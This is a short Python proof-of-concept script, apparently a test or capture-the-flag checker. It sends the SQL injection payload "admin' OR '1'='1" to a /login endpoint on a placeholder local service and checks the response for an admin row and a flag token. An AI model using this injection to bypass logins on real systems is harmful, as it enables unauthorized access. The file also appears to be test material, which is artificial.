import argparse
import requests
import sys
import time

SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
FLAG_TOKEN = '__FLAG_TOKEN__'
DEFAULT_PAYLOAD = "admin' OR '1'='1"

def wait_for_service(base_url: str, retries: int = 15) -> None:
    for _ in range(retries):
        try:
            resp = requests.get(base_url.rstrip('/') + '/accounts', timeout=5)
            if resp.ok:
                return
        except requests.RequestException:
            time.sleep(2)
    raise RuntimeError('service not reachable')

def exploit(base_url: str, payload: str) -> bool:
    url = base_url.rstrip('/') + '/login'
    try:
        resp = requests.get(url, params={'username': payload, 'password': 'irrelevant'}, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as exc:
        print(f'[sqli-compiler-mysql] request failed: {exc}', file=sys.stderr)
        return False
    try:
        payload = resp.json()
    except ValueError:
        return False
    rows = payload.get('rows') or []
    if not any(isinstance(row, dict) and row.get('username') == 'admin' for row in rows):
        return False
    if str(payload.get('flag')) != FLAG_TOKEN:
        return False
    print(SUCCESS_SIGNATURE)
    print(FLAG_TOKEN)
    return True

def main() -> None:
    parser = argparse.ArgumentParser(description='SQLi compiler PoC for MySQL sidecar runtime')
    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
    args = parser.parse_args()
    wait_for_service(args.base_url)
    if exploit(args.base_url, args.payload):
        raise SystemExit(0)
    print('[sqli-compiler-mysql] exploit did not succeed', file=sys.stderr)
    raise SystemExit(1)

if __name__ == '__main__':
    main()
